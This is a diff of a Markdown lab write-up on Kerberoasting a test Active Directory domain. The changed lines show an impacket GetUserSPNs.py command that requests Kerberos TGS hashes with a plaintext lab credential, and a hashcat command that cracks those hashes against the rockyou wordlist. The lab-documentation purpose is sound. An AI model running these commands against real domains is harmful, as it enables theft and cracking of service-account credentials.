@@ -24,14 +24,16 @@ The objective of this attack was to enumerate and extract Service Principal Name
 
 2. **DNS Configuration Update**
    - Updated the default DNS IP to point directly to the Domain Controller.
+  
 3. **SPN Extraction**
+   
    - Ran the `GetUserSPNs.py` script from the mpacket toolkit to request SPNs and attempt Kerberos TGS hash extraction:
      ```bash
      python3 GetUserSPNs.py SOC.LAB/labadmin:Root1234! -request
      ```
    - ![hash](https://github.com/user-attachments/assets/25122eab-7eb9-4de7-a62d-2ceeda7e50c9)
 
-4. **Hash Cracking**
+5. **Hash Cracking**
    - Cracked the extracted Kerberos TGS hash using hashcat with the rockyou.txt wordlist, saving the results to `cracked.txt`:
      ```bash
      hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt --force -o cracked.txt
